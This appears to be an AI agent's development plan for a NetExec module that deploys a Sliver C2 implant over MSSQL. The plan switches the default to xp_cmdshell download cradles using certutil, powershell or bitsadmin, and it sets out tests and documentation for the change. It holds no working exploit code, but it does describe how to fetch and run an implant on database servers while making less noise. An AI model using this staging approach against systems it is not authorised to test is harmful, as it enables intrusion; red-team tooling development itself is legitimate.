# MSSQL Download Staging Improvement

## Context

### Original Request
> We recently improved the winrm part of the module. So that it hosts the payload and downloads it on the machine via a selection of download tools. Our MSSQL implementation still uploads a large binary in chunks to the server. Can we improve our default MSSQL implementation to download the large binary and execute it?

### Interview Summary
**Key Discussions**:
- MSSQL currently uploads ~17MB implant in 1800-byte base64 chunks via xp_cmdshell (slow, noisy, ~9500 SQL commands)
- WinRM was recently improved to use HTTP download staging with download tools (powershell, certutil, bitsadmin)
- User wants MSSQL to use the same approach as the default behavior

**Decisions Made**:
- HTTP download staging becomes MSSQL default (breaking change from chunked upload)
- Default download tool for MSSQL: `certutil` (most reliable on older Windows, built-in)
- No automatic fallback - fail fast if HTTP staging fails
- Add `STAGING=direct` option to force old chunked upload behavior (for air-gapped targets)
- Test coverage: Unit tests + integration tests against live MSSQL target

### Self-Review (Gap Analysis)
**Identified Gaps** (addressed in plan):
1. **xp_cmdshell state management**: Current `upload()` enables/disables xp_cmdshell. HTTP staging needs same pattern.
2. **Download tool validation**: Need to reject Linux download tools (wget, curl, python) for MSSQL since it's Windows-only.
3. **Command length limits**: xp_cmdshell has ~8000 char limit. Download cradles are ~100-200 chars, well under limit.
4. **Error handling**: Need clear error message when HTTP staging fails with MSSQL.
5. **Documentation update**: README mentions MSSQL uses chunked upload - needs update.

---

## Work Objectives

### Core Objective
Change MSSQL default behavior from slow chunked binary upload to fast HTTP download staging, using `certutil` as the default download tool.

### Concrete Deliverables
- Modified `src/nxc/modules/sliver_exec.py` with MSSQL HTTP staging as default
- Updated `tests/test_protocol_handlers.py` with new MSSQL staging tests
- Updated `tests/test_sliver_exec.py` with STAGING=direct tests
- Updated `docs/USAGE.md` with MSSQL staging documentation
- Updated `docs/ARCHITECTURE.md` with MSSQL staging flow
- Updated `README.md` with MSSQL default behavior note

### Definition of Done
- [ ] `nxc mssql <target> -u <user> -p <pass> -M sliver_exec -o RHOST=<ip>` uses HTTP download staging by default
- [ ] `nxc mssql <target> -u <user> -p <pass> -M sliver_exec -o RHOST=<ip> STAGING=direct` uses chunked upload
- [ ] `poetry run pytest tests/test_protocol_handlers.py -v` passes with new MSSQL tests
- [ ] `poetry run pytest tests/test_sliver_exec.py -v` passes with STAGING=direct tests
- [ ] Integration test against live MSSQL target succeeds

### Must Have
- MSSQL defaults to HTTP download staging with `certutil`
- `STAGING=direct` opt-out for chunked upload
- Support for all Windows download tools: powershell, certutil, bitsadmin
- Clear error messages when staging fails
- xp_cmdshell enabled/disabled correctly during staging

### Must NOT Have (Guardrails)
- DO NOT add automatic fallback to chunked upload (user explicitly said fail fast)
- DO NOT support Linux download tools (wget, curl, python) for MSSQL (Windows-only protocol)
- DO NOT change WinRM, SMB, or SSH behavior
- DO NOT modify the existing `_run_beacon_staged_http()` signature (extend, don't break)
- DO NOT remove chunked upload capability (keep for STAGING=direct)
- DO NOT add new command-line options beyond STAGING=direct

---

## Verification Strategy

### Test Decision
- **Infrastructure exists**: YES (pytest with poetry run)
- **User wants tests**: YES (Unit + integration)
- **Framework**: pytest

### Verification Commands
```bash
# Unit tests
poetry run pytest tests/test_protocol_handlers.py::TestMSSQLHandler -v
poetry run pytest tests/test_sliver_exec.py -v -k "staging"

# Integration test (requires live MSSQL target)
export TARGET_HOST=<mssql_ip>
export TARGET_USER=<sa_user>
export TARGET_PASS=<password>
export SLIVER_LISTENER_HOST=<listener_ip>
poetry run pytest tests/test_integration.py -v --run-integration -k "mssql"
```

---

## Task Flow

```
Task 1 (Add STAGING=direct option)
    ↓
Task 2 (Implement MSSQL HTTP staging execution)
    ↓
Task 3 (Change MSSQL default to HTTP staging)
    ↓
Task 4 (Unit tests)
    ↓
Task 5 (Integration tests)
    ↓
Task 6 (Documentation updates)
```

## Parallelization

| Task | Depends On | Reason |
|------|------------|--------|
| 1 | - | Foundation: new option parsing |
| 2 | 1 | Needs STAGING option infrastructure |
| 3 | 2 | Needs staging execution working |
| 4 | 3 | Tests validate implementation |
| 5 | 4 | Integration after unit tests |
| 6 | 3 | Can write docs after impl done |

---

## TODOs

- [x] 1. Add STAGING=direct option for chunked upload opt-out

  **What to do**:
  - In `_validate_required_options()`, add `direct` to valid STAGING values
  - In `_parse_module_options()`, handle `STAGING=direct` to set `self.staging = False` and `self.staging_direct = True`
  - Add `self.staging_direct = False` in `__init__()`

  **Must NOT do**:
  - Do not change existing STAGING=http/tcp/https behavior
  - Do not modify option names or remove backward compatibility

  **Parallelizable**: NO (foundation task)

  **References**:

  **Pattern References** (existing code to follow):
  - `src/nxc/modules/sliver_exec.py:825-839` - Current STAGING option parsing logic
  - `src/nxc/modules/sliver_exec.py:960-972` - How STAGING value maps to self.staging boolean

  **API/Type References**:
  - `src/nxc/modules/sliver_exec.py:719-741` - Module instance variables in `__init__()`

  **Test References**:
  - `tests/test_sliver_exec.py:1143-1172` - Existing STAGING option tests

  **Acceptance Criteria**:
  - [ ] `STAGING=direct` is accepted without error
  - [ ] `STAGING=direct` sets `self.staging = False` and `self.staging_direct = True`
  - [ ] Invalid STAGING values still rejected with error
  - [ ] `poetry run pytest tests/test_sliver_exec.py -v -k "staging"` → PASS

  **Commit**: YES
  - Message: `feat(mssql): add STAGING=direct option for chunked upload opt-out`
  - Files: `src/nxc/modules/sliver_exec.py`
  - Pre-commit: `poetry run pytest tests/test_sliver_exec.py -v -k "staging"`

---

- [x] 2. Implement MSSQL HTTP staging execution path

  **What to do**:
  - In `_run_beacon_staged_http()` around line 1390, add MSSQL protocol handling alongside WinRM
  - For MSSQL, execute download cradle via `connection.execute(cmd)` (which uses xp_cmdshell)
  - Before executing, enable xp_cmdshell (copy pattern from `MSSQLHandler.upload()` lines 603-631)
  - After executing, restore xp_cmdshell state
  - Reject Linux download tools (wget, curl, python) for MSSQL with clear error message

  **Must NOT do**:
  - Do not modify WinRM execution path
  - Do not change the function signature of `_run_beacon_staged_http()`
  - Do not add automatic fallback to chunked upload

  **Parallelizable**: NO (depends on Task 1)

  **References**:

  **Pattern References** (existing code to follow):
  - `src/nxc/modules/sliver_exec.py:1389-1406` - Protocol-specific execution in `_run_beacon_staged_http()`
  - `src/nxc/modules/sliver_exec.py:603-631` - xp_cmdshell enable/disable pattern in `MSSQLHandler.upload()`
  - `src/nxc/modules/sliver_exec.py:652-661` - How MSSQL executes shell commands via `connection.execute()`

  **API/Type References**:
  - `connection.execute(shell_cmd)` - MSSQL xp_cmdshell execution
  - `connection.sql_query(sql)` - For xp_cmdshell state queries
  - `connection.conn.sql_query(sql)` - For sp_configure commands

  **Test References**:
  - `tests/test_protocol_handlers.py:249-258` - Existing MSSQL handler tests

  **Acceptance Criteria**:
  - [ ] MSSQL can execute download cradle via xp_cmdshell
  - [ ] xp_cmdshell is enabled before execution and restored after
  - [ ] Linux download tools (wget, curl, python) rejected with error for MSSQL
  - [ ] Unit test verifies MSSQL staging path is called

  **Commit**: YES
  - Message: `feat(mssql): implement HTTP download staging execution via xp_cmdshell`
  - Files: `src/nxc/modules/sliver_exec.py`
  - Pre-commit: `poetry run pytest tests/test_protocol_handlers.py::TestMSSQLHandler -v`

---

- [x] 3. Change MSSQL default to HTTP download staging

  **What to do**:
  - In `_run_beacon()` around line 1190, detect when protocol is MSSQL
  - If MSSQL and `not self.staging_direct`:
    - Auto-enable HTTP staging (`self.staging = True`)
    - Set `self.stager_port = self.stager_port or 8080`
    - Set `self.staging_method = "certutil"` (unless user specified different)
  - Call `_run_beacon_staged_http()` for MSSQL by default
  - If `STAGING=direct`, use old `MSSQLHandler.upload()` path
  - Log message indicating HTTP staging is being used

  **Must NOT do**:
  - Do not change SMB, SSH, or WinRM default behavior
  - Do not hardcode certutil - allow user override via DOWNLOAD_TOOL
  - Do not add fallback logic

  **Parallelizable**: NO (depends on Task 2)

  **References**:

  **Pattern References** (existing code to follow):
  - `src/nxc/modules/sliver_exec.py:1186-1262` - Current `_run_beacon()` protocol dispatch logic
  - `src/nxc/modules/sliver_exec.py:1194-1207` - How WinRM handles staging decision
  - `src/nxc/modules/sliver_exec.py:1264-1410` - `_run_beacon_staged_http()` implementation

  **API/Type References**:
  - `connection.__class__.__name__.lower()` - Gets protocol name (e.g., "mssql")
  - `self.staging`, `self.stager_port`, `self.staging_method` - Staging config vars

  **Acceptance Criteria**:
  - [ ] MSSQL defaults to HTTP staging without explicit STAGING=http option
  - [ ] MSSQL uses certutil as default download tool
  - [ ] MSSQL with STAGING=direct uses chunked upload
  - [ ] User can override download tool with DOWNLOAD_TOOL=powershell
  - [ ] Log message shows "HTTP download staging (certutil)" for MSSQL

  **Commit**: YES
  - Message: `feat(mssql): make HTTP download staging the default behavior`
  - Files: `src/nxc/modules/sliver_exec.py`
  - Pre-commit: `poetry run pytest tests/test_sliver_exec.py -v`

---

- [x] 4. Add unit tests for MSSQL HTTP staging

  **What to do**:
  - Add test class or methods in `tests/test_protocol_handlers.py` for MSSQL staging
  - Test that MSSQL executes download cradle via xp_cmdshell
  - Test that xp_cmdshell is enabled/disabled correctly
  - Test that Linux tools are rejected for MSSQL
  - Add tests in `tests/test_sliver_exec.py` for STAGING=direct option
  - Test that STAGING=direct forces chunked upload for MSSQL

  **Must NOT do**:
  - Do not delete existing MSSQL tests
  - Do not modify WinRM/SMB/SSH tests

  **Parallelizable**: NO (depends on Task 3)

  **References**:

  **Pattern References** (existing code to follow):
  - `tests/test_protocol_handlers.py:242-270` - Existing TestMSSQLHandler class
  - `tests/test_sliver_exec.py:1156-1172` - HTTP staging method tests
  - `tests/test_protocol_handlers.py:186-225` - WinRM handler tests (staging tests pattern)

  **Test References**:
  - `tests/conftest.py` - Shared fixtures (mock_context, mock_connection, module_instance)

  **Acceptance Criteria**:
  - [ ] Test: MSSQL staging uses certutil by default
  - [ ] Test: MSSQL staging enables xp_cmdshell
  - [ ] Test: MSSQL rejects wget/curl/python with error
  - [ ] Test: STAGING=direct uses chunked upload
  - [ ] `poetry run pytest tests/test_protocol_handlers.py::TestMSSQLHandler -v` → PASS
  - [ ] `poetry run pytest tests/test_sliver_exec.py -v -k "staging"` → PASS

  **Commit**: YES
  - Message: `test(mssql): add unit tests for HTTP download staging`
  - Files: `tests/test_protocol_handlers.py`, `tests/test_sliver_exec.py`
  - Pre-commit: `poetry run pytest tests/ -v --tb=short`

---

- [ ] 5. Run integration tests against live MSSQL target

  **What to do**:
  - Set up environment variables for MSSQL target
  - Run integration tests with `--run-integration` flag
  - Verify beacon connects via HTTP staging
  - Test STAGING=direct fallback to chunked upload
  - Document any issues found

  **Must NOT do**:
  - Do not skip this step - user explicitly requested integration testing
  - Do not commit integration test credentials

  **Parallelizable**: NO (depends on Task 4)

  **References**:

  **Pattern References**:
  - `tests/test_integration.py:226-287` - Existing HTTP staging integration tests for WinRM

  **Documentation References**:
  - `INTEGRATION_TESTS.md` - Setup instructions for integration testing

  **Acceptance Criteria**:
  - [ ] Set environment: `TARGET_HOST`, `TARGET_USER`, `TARGET_PASS`, `SLIVER_LISTENER_HOST`
  - [ ] Command: `poetry run pytest tests/test_integration.py -v --run-integration -k "mssql"`
  - [ ] Beacon successfully registers via HTTP staging
  - [ ] STAGING=direct test: beacon registers via chunked upload
  - [ ] All integration tests pass

  **Commit**: NO (verification only, unless adding new integration tests)

---

- [x] 6. Update documentation

  **What to do**:
  - Update `README.md` Quick Start section to mention MSSQL HTTP staging default
  - Update `README.md` Key Options table with STAGING=direct
  - Update `docs/USAGE.md` with MSSQL-specific examples
  - Update `docs/ARCHITECTURE.md` deployment modes section for MSSQL
  - Add note about breaking change from chunked upload to HTTP staging

  **Must NOT do**:
  - Do not remove existing documentation
  - Do not add emojis

  **Parallelizable**: YES (with Task 5, can write docs while integration tests run)

  **References**:

  **Documentation References**:
  - `README.md:20-35` - Deployment Modes section
  - `README.md:185-200` - Key Options table
  - `docs/USAGE.md` - Full usage examples
  - `docs/ARCHITECTURE.md` - Technical deployment details

  **Acceptance Criteria**:
  - [ ] README mentions MSSQL defaults to HTTP staging
  - [ ] README Key Options table includes STAGING=direct
  - [ ] USAGE.md has MSSQL HTTP staging example
  - [ ] ARCHITECTURE.md updated with MSSQL staging flow
  - [ ] Breaking change noted in documentation

  **Commit**: YES
  - Message: `docs: update documentation for MSSQL HTTP download staging default`
  - Files: `README.md`, `docs/USAGE.md`, `docs/ARCHITECTURE.md`
  - Pre-commit: None (docs only)

---

## Commit Strategy

| After Task | Message | Files | Verification |
|------------|---------|-------|--------------|
| 1 | `feat(mssql): add STAGING=direct option for chunked upload opt-out` | sliver_exec.py | pytest -k staging |
| 2 | `feat(mssql): implement HTTP download staging execution via xp_cmdshell` | sliver_exec.py | pytest TestMSSQLHandler |
| 3 | `feat(mssql): make HTTP download staging the default behavior` | sliver_exec.py | pytest |
| 4 | `test(mssql): add unit tests for HTTP download staging` | test_*.py | pytest |
| 6 | `docs: update documentation for MSSQL HTTP download staging default` | *.md | manual review |

---

## Success Criteria

### Verification Commands
```bash
# All unit tests pass
poetry run pytest tests/ -v

# MSSQL-specific tests pass
poetry run pytest tests/test_protocol_handlers.py::TestMSSQLHandler -v
poetry run pytest tests/test_sliver_exec.py -v -k "mssql or staging"

# Integration test (live target)
poetry run pytest tests/test_integration.py -v --run-integration -k "mssql"
```

### Final Checklist
- [ ] MSSQL defaults to HTTP download staging with certutil
- [ ] STAGING=direct forces chunked upload for backward compatibility
- [ ] All Windows download tools work: powershell, certutil, bitsadmin
- [ ] Linux download tools rejected for MSSQL
- [ ] xp_cmdshell enabled/disabled correctly during staging
- [ ] All unit tests pass
- [ ] Integration test against live MSSQL target passes
- [ ] Documentation updated
- [ ] No changes to SMB, SSH, or WinRM behavior
